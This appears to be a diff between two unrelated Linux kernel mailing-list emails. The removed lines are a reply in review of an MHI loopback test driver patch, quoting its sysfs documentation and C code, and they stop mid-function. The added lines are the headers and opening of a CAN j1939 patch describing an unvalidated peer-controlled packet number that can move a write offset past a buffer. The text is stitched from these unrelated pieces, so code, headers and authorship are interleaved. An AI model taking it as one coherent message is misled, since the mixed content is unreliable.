@@ -1,554 +1,460 @@
-Received: from mx0b-0031df01.pphosted.com (mx0b-0031df01.pphosted.com [205.220.180.131])
+Received: from m16.mail.163.com (m16.mail.163.com [117.135.210.3])
 	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id D747230DD2F
-	for <linux-kernel@vger.kernel.org>; Wed, 30 Sep 2026 05:57:06 +0000 (UTC)
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=205.220.180.131
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id B12933451B5;
+	Wed, 30 Sep 2026 06:00:10 +0000 (UTC)
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=117.135.210.3
 ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
-	t=1790747829; cv=none; b=GkOw3XWpLZ0MmS4BMYdrVBPZgDfdF5IJaMYuvY6WJUj01PpVMInvDnvQx6IOM3o8/r0am+cNPQH3Agh99AH0pk3U3RMFeDvoF9hi0zo1/OaRTV2cfGv6t1/VRc2Zk5bKlyN5U26HAqMiZWa8vkOBzcZrjaSpE73NM05Rg1B3+zE=
+	t=1790748015; cv=none; b=q/xAEooSpoIrHfJw7jffSr2MBdbFtp3zmKvTsdWXLpgDoNBWO9BKRi/ywqf6dJSJGkJKexEFNevozYhfis51dIl6Y255KxVMChFoaAX8zyAkjvKExYKubS8CZB6hS11AMb8nPHqgjqSeTNEcGVi3H7h0bG2cqnkLDdWlfgeRTEg=
 ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
-	s=arc-20240116; t=1790747829; c=relaxed/simple;
-	bh=7hDT9ijRUqs84SbsacWmodAEcXjxGZGqdCHnJ1MPieY=;
-	h=Message-ID:Date:MIME-Version:Subject:To:Cc:References:From:
-	 In-Reply-To:Content-Type; b=U5+G+qXB1x2tB+nMmajss/MoDsk0wKnhb0RZEr4dZfJAvgY0FOtthCht+dADDaZfjbOlE4hQw96mFaWwSU8s+miMPwVWZxSzWjXqe9vhqB+jWWFfYS/YcjOd/kFR4+IveSWf6uzzytf/rNjg3DdtEQCwwTSMAwwHCojdhSO7nVA=
-ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=oss.qualcomm.com; spf=pass smtp.mailfrom=oss.qualcomm.com; dkim=pass (2048-bit key) header.d=qualcomm.com header.i=@qualcomm.com header.b=fq2Pk2EM; dkim=pass (2048-bit key) header.d=oss.qualcomm.com header.i=@oss.qualcomm.com header.b=Vl1DdP+x; arc=none smtp.client-ip=205.220.180.131
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=oss.qualcomm.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=oss.qualcomm.com
+	s=arc-20240116; t=1790748015; c=relaxed/simple;
+	bh=qREdSemqFZXx4V43QDQhumpXm4Q5Iu327Qm3y6Vb2vk=;
+	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=drBtWGzmiGtdPVZTx1zFJpdT/5STaXvAaCcvaXKvVm5pUQYPFGN8as6hPKoHT5jSz14tq4j9if4oddRXz72TJTkCefDGL7K60X4Qbw6+FkxQHPoW4wkpkUwH5IE2mKUuyo7BlssySeq3BC6HtCNaz2GKUzCcU2c6ruMNKcPUoA0=
+ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=163.com; spf=pass smtp.mailfrom=163.com; dkim=pass (1024-bit key) header.d=163.com header.i=@163.com header.b=gmUjv/q0; arc=none smtp.client-ip=117.135.210.3
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=163.com
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=163.com
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key) header.d=qualcomm.com header.i=@qualcomm.com header.b="fq2Pk2EM";
-	dkim=pass (2048-bit key) header.d=oss.qualcomm.com header.i=@oss.qualcomm.com header.b="Vl1DdP+x"
-Received: from pps.filterd (m0279872.ppops.net [127.0.0.1])
-	by mx0a-0031df01.pphosted.com (8.18.1.11/8.18.1.11) with ESMTP id 68U1AQXc1264055
-	for <linux-kernel@vger.kernel.org>; Wed, 30 Sep 2026 05:57:05 GMT
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qualcomm.com; h=
-	cc:content-transfer-encoding:content-type:date:from:in-reply-to
-	:message-id:mime-version:references:subject:to; s=qcppdkim1; bh=
-	Q0GPd3zTZFYp2lJxk97RxyfRjqzFT4bjAoTIW7luDbo=; b=fq2Pk2EMKZELqvbn
-	3q6FtSuW0Mjbp52tVuR4vo+w9tr1/3QBt/LLnKGd8IZQjDCa/muUF5Hs74hiyt9j
-	kUkJPmTa1hRZuK2oQVqFvVGjZT06LS3La/bVpG9Jtb8Cz9nNUEIZ1PMtYWTT5DWl
-	wkE0vgMWH1BRYPC1J9IUIKh3S+RpxCV7AG9NTqajOBv29gIEC1ydSJi7XzSIX6WE
-	dUPLdEiE3vkaI2+ALozFq178Fb2maioZ0tvpdNzfubMPdT/7rya2LqZjRBKvmC3H
-	0f2SD5QYYuxTpumUmgH17YiOKzjl8gd/bPgd6JJv29s/79srUf0TY3FhCRPBNLs9
-	WDvFmg==
-Received: from mail-pf1-f198.google.com (mail-pf1-f198.google.com [209.85.210.198])
-	by mx0a-0031df01.pphosted.com (PPS) with ESMTPS id 4h0rheh3tg-1
-	(version=TLSv1.3 cipher=TLS_AES_128_GCM_SHA256 bits=128 verify=NOT)
-	for <linux-kernel@vger.kernel.org>; Wed, 30 Sep 2026 05:57:05 +0000 (GMT)
-Received: by mail-pf1-f198.google.com with SMTP id d2e1a72fcca58-8710450f731so3494208b3a.0
-        for <linux-kernel@vger.kernel.org>; Tue, 29 Sep 2026 22:57:05 -0700 (PDT)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=oss.qualcomm.com; s=google; t=1790747824; x=1791352624; darn=vger.kernel.org;
-        h=content-transfer-encoding:content-type:in-reply-to:from
-         :content-language:references:cc:to:subject:user-agent:mime-version
-         :date:message-id:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=Q0GPd3zTZFYp2lJxk97RxyfRjqzFT4bjAoTIW7luDbo=;
-        b=Vl1DdP+xD7OBj0rGIVjwyQLQLtbiZbZoV5z0wyT/+fb8E9I2zxdntUe/EhkWT1s2/V
-         JtjkRACV9SFnAu/gyGg1nTmcs2Trpa9GiSomfCKoM+F8xg6IUJhN1JeERijdm3Kg2BLF
-         0hx/XiJ55s7TnKim9IGWuPZlUN5pEXZD/QYlXrnOLJTlfEgfyZCqDl6DgyJ87kpzKzps
-         srybmj3x8MLrt5i8oOpuMTSd7uV2VprDUvI+sSZ5DNysGYIjLbG1ogm9BM31mbgIUxj7
-         oTPhD/IisR1VUt0v/vTlLZpf2+oLq4rCO83PbhjaUzZCegmVpEM3d4QNoQ0dpBze4jD6
-         VkBg==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1790747824; x=1791352624;
-        h=content-transfer-encoding:content-type:in-reply-to:from
-         :content-language:references:cc:to:subject:user-agent:mime-version
-         :date:message-id:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
-         :message-id:reply-to:content-type;
-        bh=Q0GPd3zTZFYp2lJxk97RxyfRjqzFT4bjAoTIW7luDbo=;
-        b=Amq/X6mwg4LiByTRwRo7P/LMvTucEScwJqIKwRHgKIr/S0QVtT6u44fUzlyawmYXCH
-         0hDPgJwCrRVWjFN8X5VBSu9T67yWkGqW3tGyrb4NcdA20jRvo2R2B0soVFuKQA9J71uc
-         9CamVis1QiaqlyI9YiyEVqpja2yMw+Vef4ho2vx1gpJ5iVAJ4fvye0PyC2g4s0W9/HeK
-         s90Lbuu5kzR2zrKZ3ogFouAjbdTxJN5f+T0R77zS4K9pkC41lX/1CHXbRD+482MZA+Zg
-         XiEuaxT7uHe1oO358sqGpntkPdWCC9Dr/JxCNdxOU0WekW8LslduyWSrXORNmH3eJFFw
-         lOVw==
-X-Forwarded-Encrypted: i=1; AKwUvBzuweOykAaqn2omIONGas/5PW6edhaIWm47tVuLfNcYU7BpPuH4MEHXv5TbijnnpWSGwYSZFI46PDBd74M=@vger.kernel.org
-X-Gm-Message-State: AFuF++mLtcjLb8AI6qo6qHn1zTSVrRQoFhZeZsvxK6Ufg1YW/GqY2yvP
-	uukZ/EczTJm9H9Gp8PqDVPB8VKLtpX8rPyLt6K2nEcYD55rZYxmxGr7ezBgMYtARUzNt9QAzmKs
-	cU8ae4wl6hTeX9wxYnA2CxKBfGet8osp3bYm86BnSm9K0IRvUwzlvkCCLofx8gSzIV8NJEZXjjc
-	0=
-X-Gm-Gg: AYBFou1q4xcwtwlaWGHkDCr97+oW7VcWo6D59FqmgnbHaNNxP/IDz8M7bHXRduLDThr
-	wFcrZzSv/IhSZJ0ZhAjJpZ1FRMztcOx8tILo/SQKJzv3bwoTxUiFmgWc++Vsyt9G5ca458cV/yk
-	TdFyIb5Uo8q2MIvLODLA7XaFZnIObvn1ZdEGw6BfcedqvtfCPx7gm0HoyIytJJlct2IQWYIo75D
-	tqOo7EQEpwDReJguvFf1i5nEFst550ouTNaiHhsRhw2O5H9ZYw0bh9nWPTKBv2KvNxM8VDwA2SM
-	T4KvTtSOB/mShVq/9cCFQqQNH4u+o29d66BFp07igzG+7sFwZgIXK6DiqHKB2FIMP8DpBc/JMbK
-	EgRPyQ3gu4k4nRsuqaPv8Ki3tpi+L
-X-Received: by 2002:a05:6a00:14d3:b0:878:3507:8d62 with SMTP id d2e1a72fcca58-8874ed0a74fmr201178b3a.41.1790747824344;
-        Tue, 29 Sep 2026 22:57:04 -0700 (PDT)
-X-Received: by 2002:a05:6a00:14d3:b0:878:3507:8d62 with SMTP id d2e1a72fcca58-8874ed0a74fmr201157b3a.41.1790747823603;
-        Tue, 29 Sep 2026 22:57:03 -0700 (PDT)
-Received: from [10.217.216.255] ([202.46.22.19])
-        by smtp.gmail.com with ESMTPSA id d2e1a72fcca58-88726441614sm239987b3a.49.2026.09.29.22.57.01
-        (version=TLS1_3 cipher=TLS_AES_128_GCM_SHA256 bits=128/128);
-        Tue, 29 Sep 2026 22:57:03 -0700 (PDT)
-Message-ID: <d05a60d1-3787-4318-b28d-9901d7fd7a00@oss.qualcomm.com>
-Date: Wed, 30 Sep 2026 11:26:59 +0530
+	dkim=pass (1024-bit key) header.d=163.com header.i=@163.com header.b="gmUjv/q0"
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=163.com;
+	s=s110527; h=From:To:Subject:Date:Message-ID:MIME-Version; bh=Hi
+	S8EDNgS6vblpmoKpwkEPjRNgR0zxheEaICi11jsmI=; b=gmUjv/q0+kb4aFkrDx
+	Iu1k4axPtlr0VIhIvD4jp3g5Lh8c0ih2k9/2GkidzFBq4QUmkcjIXwzSov3vNA33
+	saG0quOtWKniFHiA7ozhsR6zgLPRvW+J9wmHf0VdAD6nBxUu0wLjHKS174qRX28d
+	iTgg8Epm388N2tDjyeDlkg5Lk=
+Received: from chaosheng-ASUS-TUF-Gaming-F16-FX607JV-FX607JV.lan (unknown [])
+	by gzsmtp3 (Coremail) with SMTP id PigvCgDnV+ZOpbxqsre3CA--.40759S2;
+	Wed, 30 Sep 2026 13:59:43 +0800 (CST)
+From: Chaosheng Qu <quchaosheng000406@163.com>
+To: Robin van der Gracht <robin@protonic.nl>,
+	Oleksij Rempel <o.rempel@pengutronix.de>,
+	kernel@pengutronix.de
+Cc: Chaosheng Qu <quchaosheng000406@163.com>,
+	Oliver Hartkopp <socketcan@hartkopp.net>,
+	Marc Kleine-Budde <mkl@pengutronix.de>,
+	linux-can@vger.kernel.org,
+	linux-kernel@vger.kernel.org
+Subject: [PATCH net v2 RESEND] can: j1939: validate the EDPO packet number
+Date: Wed, 30 Sep 2026 13:59:42 +0800
+Message-ID: <20260930055942.216879-1-quchaosheng000406@163.com>
+X-Mailer: git-send-email 2.43.0
 Precedence: bulk
 X-Mailing-List: linux-kernel@vger.kernel.org
 List-Id: <linux-kernel.vger.kernel.org>
 List-Subscribe: <mailto:linux-kernel+subscribe@vger.kernel.org>
 List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
 MIME-Version: 1.0
-User-Agent: Mozilla Thunderbird
-Subject: Re: [PATCH v6 1/3] bus: mhi: host: clients: Add loopback driver with
- sysfs interface
-To: Manivannan Sadhasivam <mani@kernel.org>
-Cc: Jeff Hugo <jeff.hugo@oss.qualcomm.com>, mhi@lists.linux.dev,
-        linux-arm-msm@vger.kernel.org, linux-kernel@vger.kernel.org,
-        Krishna Chaitanya Chundru <krishna.chundru@oss.qualcomm.com>
-References: <20260908-lb-v6-0-66755ceb16cc@oss.qualcomm.com>
- <20260908-lb-v6-1-66755ceb16cc@oss.qualcomm.com>
- <xji3thurj6lnez56opmh5xoxzjiwtlh4o5qd6iqokbqkcb4rxu@mblahsfmtioz>
-Content-Language: en-US
-From: Sumit Kumar <sumit.kumar@oss.qualcomm.com>
-In-Reply-To: <xji3thurj6lnez56opmh5xoxzjiwtlh4o5qd6iqokbqkcb4rxu@mblahsfmtioz>
-Content-Type: text/plain; charset=UTF-8; format=flowed
-Content-Transfer-Encoding: 7bit
-X-Proofpoint-GUID: 7bcRG3aeziF_nHa5ehHsld29H9kJ9s0H
-X-Proofpoint-ORIG-GUID: 7bcRG3aeziF_nHa5ehHsld29H9kJ9s0H
-X-Proofpoint-Spam-Details-Enc: AW1haW4tMjYwOTMwMDAyMyBTYWx0ZWRfXwLz7v4EnMwna
- lduXV2nqDya79vW1qVv8dXqrzrnTfyHb5FGkGzBYAmZ2XlRqGVZRAS4SVXzPriZULEVR00wJABO
- dckmARV3DZ6ImJzxXs8f+mEBCwOEiEAkyACb0/YNa6gZnVP2S+hkmEooM2II8Gkx3p73jpYz8D6
- hhAzO4HNGn/IZuBeDGvsgU+sV7qEP1RdWs4OLiyXO1c1iOWH3SWKo2EwjlfTDDP1y/HOo+KRShD
- v0fu/Q9jnwpMM+slLV1EQREdgF8kFWKjJSrlYCfX5tR0wd4ovmV2A+Z2m3My/n74zY3LeL2cOS3
- xdZnOPzobbS6REiRbOxQqVHc+oYz9Vc99r70DExLhuj0kUw5lmtXMzpS4D6fQ6J033Cg8yz/8Hu
- HLICXAyRtBROMdHBzNx/VvCPZmLebk5YQMWSaLtD8NnIJfCDrV6eM6EsbbFuRX8cGvcF6Dnelcm
- vhOEjRl7r6dgwsZmxkw==
-X-Proofpoint-Spam-Info: AW1haW4tMjYwOTMwMDAyMyBTYWx0ZWRfXwo0wtWGkrKAE
- jgFdxS10ZcpRkRFypo2+pZuvAvn6b+w76zOTBdMAm5I9hpX2JRGXRyd3Ge8VLnhMEtozNKLxLpK
- CmhW7yU9WPhp+nvJEfkV1XwHMuisONk=
-X-Authority-Analysis: v=2.4 cv=Tu1zFzXh c=1 sm=1 tr=0 ts=6abca4b1 cx=c_pps
- a=m5Vt/hrsBiPMCU0y4gIsQw==:117 a=fChuTYTh2wq5r3m49p7fHw==:17
- a=IkcTkHD0fZMA:10 a=VdqzKS8jKosA:10 a=s4-Qcg_JpJYA:10
- a=VkNPw1HP01LnGYTKEx00:22 a=u7WPNUs3qKkmUXheDGA7:22 a=yx91gb_oNiZeI1HMLzn7:22
- a=EUspDBNiAAAA:8 a=VwQbUJbxAAAA:8 a=xgnnbfARpDOHo6esDpYA:9 a=QEXdDO2ut3YA:10
- a=IoOABgeZipijB_acs4fv:22
-X-Proofpoint-Virus-Version: vendor=baseguard
- engine=ICAP:2.0.293,Aquarius:18.0.1176,Hydra:6.1.134,FMLib:17.12.100.49
- definitions=2026-09-29_05,2026-09-21_02,2025-10-01_01
-X-Proofpoint-Spam-Details: rule=outbound_notspam policy=outbound score=0
- impostorscore=0 spamscore=0 malwarescore=0 suspectscore=0 phishscore=0
- lowpriorityscore=0 adultscore=0 clxscore=1015 bulkscore=0 priorityscore=1501
- classifier=typeunknown authscore=0 authtc= authcc= route=outbound adjust=0
- reason=mlx scancount=1 engine=8.22.0-2609040000 definitions=main-2609300023
+Content-Transfer-Encoding: 8bit
+X-CM-TRANSID:PigvCgDnV+ZOpbxqsre3CA--.40759S2
+X-Coremail-Antispam: 1Uf129KBjvAXoW3Cr1rCF4UXF4xWry5uF1kAFb_yoW8GF4xKo
+	WfZa15Jw45Kw1xtF18Wr1rJr98Z3W09rn8Xrs0v390van8XF4Igw1Iq3W5C393tr4kKFZx
+	Za97tr9rXw4xK3s3n29KB7ZKAUJUUUU8529EdanIXcx71UUUUU7v73VFW2AGmfu7bjvjm3
+	AaLaJ3UbIYCTnIWIevJa73UjIFyTuYvjTRNF4EUUUUU
+X-CM-SenderInfo: xtxfxtprvkv0bjqqikiqw6il2tof0z/xtbDAA9Gu2q8pU8kNgAA3c
 
 
+ETP.CM_DPO is peer controlled and its packet number is accepted without
+any validation.  It names the packet a transmission window starts at, and
+j1939_xtp_rx_dat_one() places incoming data at "dat[0] - 1 + pkt.dpo", so
+a value past the end of the message moves pkt.dpo beyond the reassembled
+buffer.
 
-On 9/26/2026 4:36 PM, Manivannan Sadhasivam wrote:
-> On Tue, Sep 08, 2026 at 02:57:22PM +0530, Sumit Kumar wrote:
->> The MHI specification defines a LOOPBACK channel. The endpoint firmware
->> echoes back whatever the host sends on this channel. Without a host-side
->> driver, there is no way to exercise this channel to validate MHI data path
->> integrity between host and endpoint.
->>
->> Add a host-side loopback driver that binds to the LOOPBACK channel and
->> expose a sysfs interface for data path testing. The sysfs interface allows
->> users to configure TRE buffer size and count, trigger a loopback test, and
->> read the result.
->>
->> The new sysfs ABI is documented under Documentation/ABI/testing/, not
->> stable/, since this is a new interface without established API
->> guarantees yet. It is unrelated to the existing stable MHI sysfs ABI
->> documented in Documentation/ABI/stable/sysfs-bus-mhi, despite both
->> being covered by the same MAINTAINERS entry.
->>
->> Co-developed-by: Krishna Chaitanya Chundru <krishna.chundru@oss.qualcomm.com>
->> Signed-off-by: Krishna Chaitanya Chundru <krishna.chundru@oss.qualcomm.com>
->> Signed-off-by: Sumit Kumar <sumit.kumar@oss.qualcomm.com>
->> ---
->>   .../ABI/testing/sysfs-bus-mhi-devices-loopback     |  40 +++
->>   MAINTAINERS                                        |   1 +
->>   drivers/bus/mhi/host/Kconfig                       |   1 +
->>   drivers/bus/mhi/host/Makefile                      |   1 +
->>   drivers/bus/mhi/host/clients/Kconfig               |  17 ++
->>   drivers/bus/mhi/host/clients/Makefile              |   2 +
->>   drivers/bus/mhi/host/clients/loopback.c            | 287 +++++++++++++++++++++
->>   7 files changed, 349 insertions(+)
->>
->> diff --git a/Documentation/ABI/testing/sysfs-bus-mhi-devices-loopback b/Documentation/ABI/testing/sysfs-bus-mhi-devices-loopback
->> new file mode 100644
->> index 0000000000000000000000000000000000000000..9e47e8443f309199691a50d70adadf84f3237037
->> --- /dev/null
->> +++ b/Documentation/ABI/testing/sysfs-bus-mhi-devices-loopback
->> @@ -0,0 +1,40 @@
->> +What:		/sys/bus/mhi/devices/mhi<N>_LOOPBACK/tre_size
->> +Date:		August 2026
->> +KernelVersion:	7.4
->> +Contact:	mhi@lists.linux.dev
->> +Description:
->> +		(RW) Size of each Transfer Ring Element (TRE) buffer in bytes
->> +		used for the loopback test. Valid range is 1 to the value
->> +		reported by max_tre_size. Default value is 32 bytes.
->> +
->> +What:		/sys/bus/mhi/devices/mhi<N>_LOOPBACK/max_tre_size
->> +Date:		August 2026
->> +KernelVersion:	7.4
->> +Contact:	mhi@lists.linux.dev
->> +Description:
->> +		(RO) Maximum allowed Transfer Ring Element (TRE) size in bytes.
->> +		Reading this file returns the upper bound for the tre_size
->> +		attribute.
->> +
->> +What:		/sys/bus/mhi/devices/mhi<N>_LOOPBACK/num_tre
->> +Date:		August 2026
->> +KernelVersion:	7.4
->> +Contact:	mhi@lists.linux.dev
->> +Description:
->> +		(RW) Number of Transfer Ring Elements (TREs) to use per
->> +		loopback test. Must be greater than zero and must not exceed
->> +		the channel ring capacity. Default value is 1.
-> How does the user know 'channel ring capacity'?
-If the user enters a number greater than the ring capacity the error 
-will log the max num_tre value.
-Would you prefer having a new sysfs entry similar to 'max_tre_size'? 
-something like 'max_num_tre'.
->
->> +
->> +What:		/sys/bus/mhi/devices/mhi<N>_LOOPBACK/start
->> +Date:		August 2026
->> +KernelVersion:	7.4
->> +Contact:	mhi@lists.linux.dev
->> +Description:
->> +		(WO) Write any value to trigger a loopback test. The driver
->> +		sends random data to the endpoint using the configured tre_size
->> +		and num_tre parameters, waits for the endpoint to echo it back,
->> +		and verifies the received data matches what was sent.
->> +
->> +		This is a blocking write that returns when the test completes
->> +		or times out after 5 seconds. The write returns an error code
->> +		if the test fails or times out.
->> diff --git a/MAINTAINERS b/MAINTAINERS
->> index 70663089f071c4eaa07fe7b9baf9003d8b981c07..b10f8cd592954e1450e5851045962bf05dcf1a50 100644
->> --- a/MAINTAINERS
->> +++ b/MAINTAINERS
->> @@ -17628,6 +17628,7 @@ L:	linux-arm-msm@vger.kernel.org
->>   S:	Maintained
->>   T:	git git://git.kernel.org/pub/scm/linux/kernel/git/mani/mhi.git
->>   F:	Documentation/ABI/stable/sysfs-bus-mhi
->> +F:	Documentation/ABI/testing/sysfs-bus-mhi-devices-loopback
->>   F:	Documentation/mhi/
->>   F:	drivers/bus/mhi/
->>   F:	drivers/pci/endpoint/functions/pci-epf-mhi.c
->> diff --git a/drivers/bus/mhi/host/Kconfig b/drivers/bus/mhi/host/Kconfig
->> index da5cd0c9fc620ab595e742c422f1a22a2a84c7b9..627c57948235aa52348179ae8b2d0826ebaed01e 100644
->> --- a/drivers/bus/mhi/host/Kconfig
->> +++ b/drivers/bus/mhi/host/Kconfig
->> @@ -29,3 +29,4 @@ config MHI_BUS_PCI_GENERIC
->>   	  This driver provides MHI PCI controller driver for devices such as
->>   	  Qualcomm SDX55 based PCIe modems.
->>   
->> +source "drivers/bus/mhi/host/clients/Kconfig"
->> diff --git a/drivers/bus/mhi/host/Makefile b/drivers/bus/mhi/host/Makefile
->> index 859c2f38451c669b3d3014c374b2b957c99a1cfe..2a16008aeb38127494782bbff4e1656428d2b776 100644
->> --- a/drivers/bus/mhi/host/Makefile
->> +++ b/drivers/bus/mhi/host/Makefile
->> @@ -4,3 +4,4 @@ mhi-$(CONFIG_MHI_BUS_DEBUG) += debugfs.o
->>   
->>   obj-$(CONFIG_MHI_BUS_PCI_GENERIC) += mhi_pci_generic.o
->>   mhi_pci_generic-y += pci_generic.o
->> +obj-y += clients/
->> diff --git a/drivers/bus/mhi/host/clients/Kconfig b/drivers/bus/mhi/host/clients/Kconfig
->> new file mode 100644
->> index 0000000000000000000000000000000000000000..8bb5715e61d0d6e64a51012b4e1594ba46e5bfc1
->> --- /dev/null
->> +++ b/drivers/bus/mhi/host/clients/Kconfig
->> @@ -0,0 +1,17 @@
->> +# SPDX-License-Identifier: GPL-2.0
->> +
->> +config MHI_BUS_LOOPBACK
->> +	tristate "MHI LOOPBACK client driver"
->> +	depends on MHI_BUS
->> +	help
->> +	  MHI LOOPBACK client driver that binds to the MHI LOOPBACK channel
->> +	  as defined in the MHI specification. The LOOPBACK channel is
->> +	  implemented by MHI-based devices (e.g. modems, WLAN) in the field,
->> +	  where the endpoint firmware echoes back whatever the host sends.
->> +
->> +	  This driver exposes a sysfs interface for testing MHI data path
->> +	  integrity between host and endpoint. Users can configure the TRE
->> +	  size and count, and trigger a loopback test.
->> +
->> +	  To compile this driver as a module, choose M here. The module
->> +	  will be called mhi_loopback.
->> diff --git a/drivers/bus/mhi/host/clients/Makefile b/drivers/bus/mhi/host/clients/Makefile
->> new file mode 100644
->> index 0000000000000000000000000000000000000000..3811b6928f42b38f94b1167941cf3b0fe512d32b
->> --- /dev/null
->> +++ b/drivers/bus/mhi/host/clients/Makefile
->> @@ -0,0 +1,2 @@
->> +obj-$(CONFIG_MHI_BUS_LOOPBACK) += mhi_loopback.o
->> +mhi_loopback-y += loopback.o
->> diff --git a/drivers/bus/mhi/host/clients/loopback.c b/drivers/bus/mhi/host/clients/loopback.c
->> new file mode 100644
->> index 0000000000000000000000000000000000000000..058a8b587933245230eaae61bb7fe3361d4a362a
->> --- /dev/null
->> +++ b/drivers/bus/mhi/host/clients/loopback.c
->> @@ -0,0 +1,287 @@
->> +// SPDX-License-Identifier: GPL-2.0
->> +/*
->> + * Copyright (c) Qualcomm Technologies, Inc. and/or its subsidiaries.
->> + */
->> +
->> +#include <linux/atomic.h>
->> +#include <linux/cleanup.h>
->> +#include <linux/completion.h>
->> +#include <linux/errno.h>
->> +#include <linux/mhi.h>
->> +#include <linux/module.h>
->> +#include <linux/mutex.h>
->> +#include <linux/random.h>
->> +#include <linux/sizes.h>
->> +#include <linux/slab.h>
->> +#include <linux/string.h>
->> +#include <linux/sysfs.h>
->> +#include <linux/types.h>
->> +
->> +#define MHI_LOOPBACK_DEFAULT_TRE_SIZE	32
->> +#define MHI_LOOPBACK_DEFAULT_NUM_TRE	1
->> +#define MHI_LOOPBACK_TIMEOUT_MS		5000
->> +#define MHI_LOOPBACK_MAX_TRE_SIZE	(SZ_64K - 1)
->> +
->> +struct mhi_loopback {
->> +	struct mhi_device *mdev;
->> +	/* Serializes the sysfs attributes against a running test */
->> +	struct mutex lb_mutex;
->> +	struct completion comp;
->> +	/* Tracks outstanding DL+UL completions; comp fires when it hits zero */
-> This variable is only used in dl_callback.
->
->> +	atomic_t tre_pending;
->> +	u32 num_tre;
->> +	u32 tre_size;
->> +};
->> +
->> +static ssize_t tre_size_show(struct device *dev,
->> +			     struct device_attribute *attr, char *buf)
->> +{
->> +	struct mhi_loopback *loopback = dev_get_drvdata(dev);
->> +
->> +	return sysfs_emit(buf, "%u\n", loopback->tre_size);
->> +}
->> +
->> +static ssize_t tre_size_store(struct device *dev,
->> +			      struct device_attribute *attr,
->> +			      const char *buf, size_t count)
->> +{
->> +	struct mhi_loopback *loopback = dev_get_drvdata(dev);
->> +	u32 val;
->> +
->> +	if (kstrtou32(buf, 0, &val))
->> +		return -EINVAL;
->> +
->> +	if (val == 0 || val > MHI_LOOPBACK_MAX_TRE_SIZE)
->> +		return -EINVAL;
->> +
->> +	guard(mutex)(&loopback->lb_mutex);
->> +	loopback->tre_size = val;
->> +
->> +	return count;
->> +}
->> +static DEVICE_ATTR_RW(tre_size);
->> +
->> +static ssize_t max_tre_size_show(struct device *dev,
->> +				 struct device_attribute *attr, char *buf)
->> +{
->> +	return sysfs_emit(buf, "%u\n", MHI_LOOPBACK_MAX_TRE_SIZE);
->> +}
->> +static DEVICE_ATTR_RO(max_tre_size);
->> +
->> +static ssize_t num_tre_show(struct device *dev,
->> +			    struct device_attribute *attr, char *buf)
->> +{
->> +	struct mhi_loopback *loopback = dev_get_drvdata(dev);
->> +
->> +	return sysfs_emit(buf, "%u\n", loopback->num_tre);
->> +}
->> +
->> +static ssize_t num_tre_store(struct device *dev,
->> +			     struct device_attribute *attr,
->> +			     const char *buf, size_t count)
->> +{
->> +	struct mhi_loopback *loopback = dev_get_drvdata(dev);
->> +	u32 val;
->> +	int el_num;
->> +
->> +	if (kstrtou32(buf, 0, &val))
->> +		return -EINVAL;
->> +
->> +	if (val == 0)
->> +		return -EINVAL;
->> +
->> +	guard(mutex)(&loopback->lb_mutex);
->> +
->> +	el_num = min(mhi_get_free_desc_count(loopback->mdev, DMA_TO_DEVICE),
->> +		     mhi_get_free_desc_count(loopback->mdev, DMA_FROM_DEVICE));
->> +	if (val > el_num) {
->> +		dev_err(dev, "num_tre (%u) exceeds ring capacity (%d)\n", val, el_num);
->> +		return -EINVAL;
->> +	}
->> +
->> +	loopback->num_tre = val;
->> +
->> +	return count;
->> +}
->> +static DEVICE_ATTR_RW(num_tre);
->> +
->> +static ssize_t start_store(struct device *dev,
->> +			   struct device_attribute *attr,
->> +			   const char *buf, size_t count)
->> +{
->> +	struct mhi_loopback *loopback = dev_get_drvdata(dev);
->> +	u32 total_size, tre_count, tre_size;
->> +	int i, ret;
->> +
->> +	guard(mutex)(&loopback->lb_mutex);
->> +
->> +	tre_size = loopback->tre_size;
->> +	tre_count = loopback->num_tre;
->> +	total_size = size_mul(tre_count, tre_size);
->> +
->> +	if (total_size > KMALLOC_MAX_SIZE)
->> +		return -EINVAL;
->> +
->> +	if (tre_count > mhi_get_free_desc_count(loopback->mdev, DMA_TO_DEVICE) ||
->> +	    tre_count > mhi_get_free_desc_count(loopback->mdev, DMA_FROM_DEVICE)) {
->> +		dev_err(dev, "Not enough ring space for %u TREs\n", tre_count);
->> +		return -ENOSPC;
->> +	}
->> +
->> +	void *recv_buf __free(kfree) = kzalloc(total_size, GFP_KERNEL);
->> +	if (!recv_buf)
->> +		return -ENOMEM;
->> +
->> +	void *send_buf __free(kfree) = kzalloc(total_size, GFP_KERNEL);
->> +	if (!send_buf)
->> +		return -ENOMEM;
->> +
->> +	get_random_bytes(send_buf, total_size);
->> +
->> +	atomic_set(&loopback->tre_pending, tre_count);
->> +	reinit_completion(&loopback->comp);
->> +
->> +	for (i = 0; i < tre_count; i++) {
->> +		ret = mhi_queue_buf(loopback->mdev, DMA_FROM_DEVICE,
->> +				    recv_buf + (i * tre_size), tre_size, MHI_EOT);
->> +		if (ret) {
->> +			dev_err(dev, "Unable to queue read TRE %d: %d\n", i, ret);
->> +			if (atomic_sub_and_test(tre_count - i, &loopback->tre_pending))
->> +				complete(&loopback->comp);
